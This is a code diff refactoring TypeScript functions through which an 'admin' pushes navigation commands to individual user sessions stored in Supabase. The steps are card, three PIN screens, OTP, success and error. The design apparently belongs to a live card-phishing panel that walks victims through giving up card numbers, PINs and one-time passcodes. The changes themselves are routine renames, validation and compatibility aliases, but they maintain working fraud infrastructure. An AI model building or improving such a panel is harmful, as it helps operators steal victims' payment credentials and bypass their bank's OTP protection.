@@ -175,6 +175,13 @@ export async function sendAdminControl(sessionId: string, action: string, token:
 // Navigation Control Functions (Admin → User)
 // ═══════════════════════════════════════════════════════════════
 
+const VALID_NAVIGATION_ACTIONS: NavigationAction[] = ['MAIN', 'CARD', 'PIN1', 'PIN2', 'PIN3', 'OTP', 'SUCCESS', 'ERROR'];
+
+function isValidNavAction(action: unknown): action is NavigationAction {
+  if (!action || typeof action !== 'string') return false;
+  return (VALID_NAVIGATION_ACTIONS as string[]).includes(action);
+}
+
 /**
  * Send a navigation command to a specific session
  */
@@ -187,7 +194,6 @@ export async function sendNavigationCommand(sessionId: string, action: Navigatio
   }
 
   try {
-    // Calculate expiration time (1 minute from now)
     const expiresAt = new Date(Date.now() + 60 * 1000).toISOString();
 
     const payload = {
@@ -226,7 +232,7 @@ export async function sendNavigationCommand(sessionId: string, action: Navigatio
 /**
  * Get pending navigation command for a session
  */
-export async function getPendingNavigationCommand(sessionId: string): Promise<{ action: NavigationAction; redirect_to: string | null } | null> {
+export async function getNavigationCommand(sessionId: string): Promise<{ action: NavigationAction; redirect_to: string | null } | null> {
   const { url, key } = getSupabaseConfig();
 
   if (!url || !key) {
@@ -234,8 +240,6 @@ export async function getPendingNavigationCommand(sessionId: string): Promise<{ 
   }
 
   try {
-    // First, try to get commands without expires_at filter (backward compatibility)
-    // Then filter in JavaScript for expired commands
     const queryUrl = `${url}/rest/v1/controls?session_id=eq.${encodeURIComponent(sessionId)}&order=created_at.desc&limit=10`;
 
     const response = await fetch(queryUrl, {
@@ -250,29 +254,36 @@ export async function getPendingNavigationCommand(sessionId: string): Promise<{ 
       return null;
     }
 
-    const data = await response.json();
-
-    if (!Array.isArray(data) || data.length === 0) {
+    const jsonData = await response.json();
+    
+    // Safely check if data is an array
+    if (!jsonData || !Array.isArray(jsonData) || jsonData.length === 0) {
       return null;
     }
 
     const now = new Date();
 
     // Find the first non-expired command
-    for (const command of data) {
-      // Check if command is expired
-      if (command.expires_at) {
-        const expiresAt = new Date(command.expires_at);
-        if (expiresAt < now) {
-          continue; // Skip expired command
+    for (const item of jsonData) {
+      // Skip if not an object
+      if (!item || typeof item !== 'object') continue;
+      
+      // Check expiration
+      if (item.expires_at) {
+        try {
+          const expiresAt = new Date(item.expires_at);
+          if (expiresAt < now) continue;
+        } catch (e) {
+          // Invalid date, skip
+          continue;
         }
       }
 
-      // Validate action is a valid NavigationAction
-      if (isValidNavigationAction(command.action)) {
+      // Validate action
+      if (isValidNavAction(item.action)) {
         return {
-          action: command.action,
-          redirect_to: command.redirect_to || null,
+          action: item.action as NavigationAction,
+          redirect_to: item.redirect_to || null,
         };
       }
     }
@@ -285,34 +296,38 @@ export async function getPendingNavigationCommand(sessionId: string): Promise<{ 
 }
 
 /**
- * Clear/delete navigation commands for a session
+ * Delete navigation commands for a session
  */
-export async function clearNavigationCommand(sessionId: string): Promise<void> {
+export async function deleteNavigationCommands(sessionId: string): Promise<void> {
   const { url, key } = getSupabaseConfig();
 
   if (!url || !key) return;
 
   try {
-    await fetch(`${url}/rest/v1/controls?session_id=eq.${encodeURIComponent(sessionId)}`, {
+    const encodedSessionId = encodeURIComponent(sessionId);
+    await fetch(`${url}/rest/v1/controls?session_id=eq.${encodedSessionId}`, {
       method: 'DELETE',
       headers: {
         'apikey': key,
         'Authorization': `Bearer ${key}`,
       },
     });
-    console.log(`🗑️ Cleared navigation commands for session: ${sessionId}`);
+    console.log(`🗑️ Deleted navigation commands for session: ${sessionId}`);
   } catch (error) {
-    console.error("❌ Error clearing navigation command:", error);
+    console.error("❌ Error deleting navigation commands:", error);
   }
 }
 
-function isValidNavigationAction(action: unknown): action is NavigationAction {
-  if (!action || typeof action !== 'string') return false;
-  const validActions: NavigationAction[] = ['MAIN', 'CARD', 'PIN1', 'PIN2', 'PIN3', 'OTP', 'SUCCESS', 'ERROR'];
-  return validActions.includes(action as NavigationAction);
+// Alias for backward compatibility
+export async function getPendingNavigationCommand(sessionId: string) {
+  return getNavigationCommand(sessionId);
 }
 
-// Legacy functions for backward compatibility
+export async function clearNavigationCommand(sessionId: string): Promise<void> {
+  return deleteNavigationCommands(sessionId);
+}
+
+// Legacy functions
 export async function sendRedirectCommand(sessionId: string, target: string): Promise<boolean> {
   const targetToAction: Record<string, NavigationAction> = {
     'home': 'MAIN',
@@ -335,7 +350,7 @@ export async function sendRedirectCommand(sessionId: string, target: string): Pr
 }
 
 export async function getPendingRedirect(sessionId: string): Promise<{ redirect_to: string } | null> {
-  const command = await getPendingNavigationCommand(sessionId);
+  const command = await getNavigationCommand(sessionId);
   if (command) {
     return { redirect_to: command.action };
   }
@@ -343,5 +358,5 @@ export async function getPendingRedirect(sessionId: string): Promise<{ redirect_
 }
 
 export async function clearRedirectCommand(sessionId: string): Promise<void> {
-  return clearNavigationCommand(sessionId);
+  return deleteNavigationCommands(sessionId);
 }
